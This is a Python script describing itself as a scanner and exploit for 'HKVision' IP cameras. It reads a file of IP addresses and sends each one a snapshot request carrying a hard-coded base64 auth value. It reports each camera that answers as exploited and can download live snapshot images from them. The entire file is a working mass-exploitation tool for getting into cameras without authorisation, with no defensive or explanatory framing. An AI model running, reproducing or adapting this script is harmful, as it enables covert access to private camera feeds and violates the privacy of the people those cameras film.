import argparse
import requests
from datetime import date
from urllib import request
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Connection timed out")

    

def dowloadSnapshotImg(url, ip, port):
    file_url = url
    file = str(ip) + "-" + str(port) + "_" + str(date.today()) + ".jfif"
    try:
        request.urlretrieve(file_url, file)
    except:
        print("[!] Vulnerable but could not download File")

def isVulnerable(url, verbose, ip, port, timeout=10):
    payload = "/onvif-http/snapshot?auth=YWRtaW46MTEK"
   
    try:
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(timeout)  # Set the timeout
        r = requests.get(url + payload)
        signal.alarm(0)  # Reset the alarm
        status_code = r.status_code
    except TimeoutError:
        print("[!] Connection error - timed out after 10 seconds. Skipping.")
        return
    except KeyboardInterrupt:
        print("\n[!] Script stopped by user.")
        exit()
    except Exception as e:
        print("[!] Connection error:", str(e))
        status_code = 404
        pass

    if status_code == 200:
        print("[+] Exploited ! --> " + url + payload)
        if dowloadSnapshot:
            dowloadSnapshotImg(url + payload, ip, port)
    else:
        if verbose:
            print("[!] Not vulnerable")

def scan(ip_file, verbose):
    with open(ip_file, 'r') as file:
        for line in file:
            ip = line.strip()
            port = 80  # You may need to adjust the port if it's different in your case
            url = "http://" + str(ip) + ":" + str(port)
            print("[!] Testing " + url)
            isVulnerable(url, verbose, ip, port)

parser = argparse.ArgumentParser(description='Scanner and exploit for HKVision Cams')
parser.add_argument('-i', '--ipfile', help='File containing IPs to scan', type=str, required=True)
parser.add_argument('-s', '--savefile', action='store_true', help='Save snapshots from vulnerable cams')
parser.add_argument('-v', '--verbose', action='store_true', help='Verbose option')
args = parser.parse_args()
ip_file = args.ipfile
verbose = args.verbose
dowloadSnapshot = args.savefile

if verbose:
    print("[+] Verbose: on")
else:
    print("[+] Verbose: off")
    verbose = False
if dowloadSnapshot:
    print("[+] Download snapshot: on")
else:
    print("[+] Download snapshot: off")
    dowloadSnapshot = False

scan(ip_file, verbose)
